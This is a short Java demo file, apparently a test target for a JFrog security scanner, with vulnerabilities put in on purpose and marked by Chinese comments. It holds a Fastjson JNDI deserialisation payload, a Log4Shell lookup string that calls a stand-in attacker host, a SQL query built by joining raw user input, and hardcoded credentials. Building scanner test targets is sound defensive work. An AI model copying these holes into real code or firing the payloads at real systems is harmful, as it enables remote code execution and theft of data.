package com.example.jfrog.demo;

import com.alibaba.fastjson.JSON;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class DemoApplication {

    private static final Logger logger = LogManager.getLogger();
    private static String secretValue = "secr37Value";

    public static void main(String[] args) {
        // Fastjson RCE 测试
        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
        JSON jsonObject = JSON.parseObject(payload);
        logger.info("Parsed JSON: " + jsonObject.toString());

        // Log4Shell 测试
        logger.error("${jndi:ldap://somesitehackerofhell.com/z}");

        // SQL 注入测试：从命令行参数读取输入
        if (args.length > 0) {
            String userInput = args[0]; // 模拟用户输入
            vulnerableQuery(userInput);
        } else {
            logger.warn("No SQL input provided");
        }
    }

    public static void vulnerableQuery(String userInput) {
        try {
            Connection conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/testdb", "testuser", "testpass");
            Statement stmt = conn.createStatement();

            // 漏洞点：直接拼接用户输入，SQL 注入高危代码
            String query = "SELECT * FROM users WHERE username = '" + userInput + "'";
            logger.info("Executing query: " + query);

            ResultSet rs = stmt.executeQuery(query);
            while (rs.next()) {
                System.out.println("User found: " + rs.getString("username"));
            }

            rs.close();
            stmt.close();
            conn.close();
        } catch (Exception e) {
            logger.error("Database error", e);
        }
    }
}
